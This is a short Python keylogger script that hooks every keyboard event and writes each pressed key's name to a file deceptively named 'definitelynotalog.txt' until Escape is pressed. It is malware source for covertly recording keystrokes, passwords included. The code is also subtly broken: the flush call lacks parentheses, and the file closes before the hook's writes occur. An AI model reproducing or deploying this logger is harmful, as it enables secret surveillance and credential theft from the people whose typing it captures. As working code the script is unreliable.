import keyboard



#this will record all key press downs. 
with open("definitelynotalog.txt", "w") as f:
    def key_event(event):
        if event.event_type == 'down':
            f.write((f"Key: {event.name}"))
            f.flush # write immediately


#hook monitors all keyboard events.
    keyboard.hook(key_event)
    
#cancels when 'esc' is pressed.
keyboard.wait('esc')


